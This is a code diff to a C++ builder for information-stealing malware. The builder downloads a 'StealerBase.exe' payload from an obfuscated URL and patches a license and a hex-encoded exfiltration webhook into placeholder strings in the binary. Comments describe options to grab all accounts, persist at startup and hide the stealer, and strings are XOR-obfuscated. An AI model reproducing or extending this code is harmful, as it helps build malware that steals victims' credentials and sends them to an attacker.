@@ -10,6 +10,10 @@
 #include <fstream>
 #include <sstream>
 #include "XorString.h"
+#include <stdexcept>
+#include <sstream>
+#include <iomanip>
+#include <cstdint>
 #pragma comment(lib, "wininet.lib")
 #pragma comment(lib, "urlmon.lib")
 #define XorString( String ) ( CXorString<ConstructIndexList<sizeof( String ) - 1>::Result>( String ).decrypt() )
@@ -26,6 +30,17 @@ string decrypt2(string toEncrypt);
 // command syntax: [ID]==[WebHook_URL]==[Path]==[AAP-Data]==[Tracer:(Y/N)]--[Recover:(Y/N)]--[GetAllAccs:(Y/N)]--[DeleteGT:(Y/N)]--[StartUp:(Y/N)]--[HideStealer:(Y/N)]==[Title]==[Message]==
 // ID has to be 8 chars
 // ID has to be combined with HWID. Example: [ID{HWID}]
+
+std::string string_to_hex(const std::string& in) {
+	std::stringstream ss;
+
+	ss << std::hex << std::setfill('0');
+	for (size_t i = 0; in.length() > i; ++i) {
+		ss << std::setw(2) << static_cast<unsigned int>(static_cast<unsigned char>(in[i]));
+	}
+
+	return ss.str();
+}
 
 std::string ReplaceAll(std::string str, const std::string& from, const std::string& to) {
 	size_t start_pos = 0;
@@ -81,7 +96,7 @@ int main(int argc, char* argv[])
 		{
 			string UnencryptedWebHook = CMDParts[1];
 			string RemovedBracketsWB = UnencryptedWebHook.substr(1, UnencryptedWebHook.size() - 2);
-			string WebHook = decrypt(RemovedBracketsWB);
+			string WebHook = string_to_hex(decrypt2(RemovedBracketsWB));
 			string tempPath = getenv("TEMP");
 			string StealerBase = tempPath + "\\StealerBase.exe";
 			DownloadFile(DownloadString(decrypt2("21$8*h//*$#<<0int&?%v awu&ey*99Q2")), StealerBase);
@@ -91,8 +106,8 @@ int main(int argc, char* argv[])
 			string DummyLicense = XorStr("[zbuilder{zbuilder}]");
 			size_t DummyLicenseLocation = AllBytes.find(DummyLicense);
 			AllBytes.replace(DummyLicenseLocation, DummyLicense.length(), decrypt(License));
-			string DummyText = XorStr("[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]");
-			string DummyText2 = XorStr("<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>");
+			string DummyText = XorStr("[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]");
+			string DummyText2 = XorStr("<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>");
 			size_t DummyTextLocation = AllBytes.find(DummyText);
 			size_t DummyText2Location = AllBytes.find(DummyText2);
 			AllBytes.replace(DummyTextLocation, WebHook.length(), WebHook);
